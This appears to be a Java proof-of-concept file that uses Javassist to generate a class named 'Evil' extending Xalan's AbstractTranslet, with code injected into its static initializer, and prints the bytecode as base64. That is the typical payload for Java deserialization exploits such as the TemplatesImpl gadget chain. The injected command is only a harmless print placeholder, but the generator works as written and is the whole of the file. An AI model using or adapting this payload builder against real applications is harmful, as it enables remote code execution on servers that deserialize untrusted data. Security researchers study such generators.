import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class Base64EvilByteCode {
    public byte[] generatePoc() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        String staticCmd = "System.out.println(\"xxxxxxxxxxxxxxxx******xxxxxxxxxxxxxxx\");";
        ctClass.makeClassInitializer().insertBefore(staticCmd);
        byte[] bytes = ctClass.toBytecode();
        return bytes;
    }
    public static void main(String[] args) throws Exception {
        byte[] bytes = (new Base64EvilByteCode()).generatePoc();
        String t = new BASE64Encoder().encodeBuffer(bytes);
        System.out.println(t);
    }
}
